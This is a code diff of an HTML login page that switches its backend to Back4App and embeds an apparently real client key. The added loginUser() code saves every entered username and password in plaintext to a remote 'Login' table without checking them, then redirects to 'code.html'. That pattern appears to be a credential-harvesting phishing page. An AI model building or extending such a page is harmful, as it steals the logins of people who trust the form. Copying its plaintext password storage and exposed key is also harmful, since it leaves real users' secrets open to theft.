@@ -1,14 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script type="module">
-  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+ <script src="https://npmcdn.com/parse/dist/parse.min.js"></script>
+  <script>
+    // ✅ Initialize Parse with your Back4App credentials
+    Parse.initialize("YOUR_APP_ID", "WrsnK1uikCQ0HS4Rmmi1lDDftRmHriUJu0ZacVSY");
+    Parse.serverURL = "https://parseapi.back4app.com";
+  </script>
 
-  window.supabase = createClient(
-    'https://YOUR_PROJECT_ID.supabase.co',
-    'YOUR_PUBLIC_ANON_KEY'
-  );
-</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
 
@@ -431,52 +430,48 @@
   }
 
   function loginUser() {
-    const usernameInput = document.getElementById("username");
-    const passwordInput = document.getElementById("password");
+  const usernameInput = document.getElementById("username");
+  const passwordInput = document.getElementById("password");
 
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value.trim();
+  const username = usernameInput.value.trim();
+  const password = passwordInput.value.trim();
 
-    // Clear previous error states
-    document.querySelectorAll('.error-message').forEach(el => el.remove());
-    [usernameInput, passwordInput].forEach(input => {
-      input.style.borderColor = '#ccc';
-    });
+  // Clear previous error states
+  document.querySelectorAll('.error-message').forEach(el => el.remove());
+  [usernameInput, passwordInput].forEach(input => {
+    input.style.borderColor = '#ccc';
+  });
 
-    let hasError = false;
+  let hasError = false;
 
-    if (!username) {
-      showError(usernameInput);
-      hasError = true;
-    }
+  if (!username) {
+    showError(usernameInput);
+    hasError = true;
+  }
 
-    if (!password) {
-      showError(passwordInput);
-      hasError = true;
-    }
+  if (!password) {
+    showError(passwordInput);
+    hasError = true;
+  }
 
-    if (hasError) return;
+  if (hasError) return;
 
-    // Proceed with login fetch
-    fetch('/save-login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password })
+  // ✅ Use Back4App to save login data
+  const Login = Parse.Object.extend("Login");
+  const login = new Login();
+  login.set("username", username);
+  login.set("password", password); // ⚠️ You should hash passwords in real apps
+
+  login.save()
+    .then(() => {
+      localStorage.setItem("login_user", username);
+      window.location.href = "code.html"; // or wherever you want to redirect
     })
-    .then(res => res.json())
-    .then(data => {
-      if (data.success) {
-        localStorage.setItem("login_user", username);
-        window.location.href = "code.html";
-      } else {
-        alert("Login failed. Try again.");
-      }
-    })
-    .catch(err => {
-      console.error('Login error:', err);
+    .catch((error) => {
+      console.error("Login save failed:", error);
       alert("An error occurred while submitting the login.");
     });
-  }
+}
 
   // Keyboard detection and footer adjustment
   (() => {
